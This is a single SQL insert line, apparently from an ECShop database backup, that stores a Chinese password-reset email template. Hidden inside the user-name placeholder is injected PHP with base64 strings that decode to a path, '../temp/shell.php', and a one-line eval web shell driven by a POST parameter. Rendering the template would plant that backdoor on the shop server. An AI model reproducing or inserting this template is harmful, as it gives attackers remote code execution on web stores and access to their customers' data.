...
E_D("replace into `ecs_mail_templates` values('1','send_password','0','密码找回','{\$user_namebase64_decode(''Li4vdGVtcC9zaGVsbC5waHA''PD9waHAgQGV2YWwoJF9QT1NUWycyMDcnXSk7Pz4=''));echo \$var[''\$user_name}<p>{\$user_name}您好！<br />\r\n<br />\r\n您已经进行了密码重置的操作，请点击以下链接(或者复制到您的浏览器):<br />\r\n<br />\r\n<a target=\"_blank\" href=\"{\$reset_email}\">{\$reset_email}</a><br />\r\n<br />\r\n以确认您的新密码重置操作！<br />\r\n<br />\r\n{\$shop_name}<br />\r\n{\$send_date}</p>','1438731569','0','template');");
